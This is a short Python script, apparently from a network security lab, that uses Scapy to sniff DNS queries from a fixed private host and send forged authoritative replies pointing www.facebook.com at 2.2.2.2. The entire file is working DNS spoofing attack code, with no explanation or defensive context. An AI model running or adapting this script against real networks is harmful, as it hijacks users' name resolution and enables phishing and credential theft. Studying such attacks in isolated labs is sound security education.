#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'www.facebook.com' in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()

    # Swap src and dst IP addresses
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap src and dst port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    
    spoof = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='2.2.2.2')

    # DNS packet construction
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=spoof)

    # Send out the constructed IP packet
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# To sniff the UDP query packets and call spoof_dns() function
f = 'udp and src host 10.9.0.7 and dst port 53'
pkt = sniff(iface='br-9024ff564629', filter=f, prn=spoof_dns)      
